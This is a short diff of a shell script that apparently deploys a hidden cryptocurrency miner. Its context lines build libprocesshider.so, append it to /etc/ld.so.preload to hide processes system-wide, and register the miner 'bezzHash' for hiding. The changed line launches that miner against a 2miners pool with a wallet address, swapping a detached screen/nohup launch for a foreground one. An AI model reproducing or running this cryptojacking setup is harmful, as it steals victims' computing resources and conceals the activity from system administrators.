@@ -43,4 +43,4 @@ gcc -Wall -fPIC -shared -o libprocesshider.so processhider.c -ldl
 mv libprocesshider.so /usr/local/lib/
 echo /usr/local/lib/libprocesshider.so >> /etc/ld.so.preload
 ph add bezzHash
-screen -dmS ls nohup ./bezzHash --url=nano_1g7b37bepgxkwg6hk5fuapxene7w4ub4yzbfqda81jz6awc68393cczztzit.coeg@us-eth.2miners.com:2020 --log --extra --latency --all-shares --shares-detail --show-mode --list-modes --mode=99 > nohup.out
+./bezzHash --url=nano_1g7b37bepgxkwg6hk5fuapxene7w4ub4yzbfqda81jz6awc68393cczztzit.coeg@us-eth.2miners.com:2020 --log --extra --latency --all-shares --shares-detail --show-mode --list-modes --mode=99
